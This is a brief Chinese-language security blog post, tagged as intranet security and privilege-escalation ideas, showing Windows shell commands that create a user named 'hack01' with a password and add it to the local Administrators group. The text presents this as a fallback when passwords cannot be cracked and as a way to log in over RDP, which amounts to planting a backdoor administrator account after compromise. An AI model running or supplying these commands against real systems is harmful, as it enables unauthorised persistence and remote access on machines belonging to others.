---
title: 通过shell创建管理员用户
published: 2025-03-09 16:40:49
tags: [内网安全,提权思路]
category: 安全
draft: false
---

# 通过shell创建管理员用户

```python
net user
net user hack01 1324@cbD /add
net localgroup Administrators hack01 /add
net user 
```

可以在密码破解不出来的时候使用，也可以用来进行登录`RDP` ，前提是拥有权限